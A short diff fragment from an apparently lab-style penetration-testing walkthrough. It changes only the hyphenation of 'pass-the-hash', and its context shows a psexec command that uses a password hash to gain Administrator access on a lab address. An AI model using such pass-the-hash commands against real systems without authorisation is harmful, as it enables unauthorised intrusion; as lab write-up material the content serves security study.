@@ -62,7 +62,7 @@ keepass2john, john (John the Ripper)
    ```
 
 8. **Using psexec for Access:**
-   - Exploit the pass-the-hash vulnerability with `psexec` to gain access as the Administrator.
+   - Exploit the pass the hash vulnerability with `psexec` to gain access as the Administrator.
    ```bash
    psexec WORKGROUP/Administrator@10.10.10.63 -hashes :hash
    ```
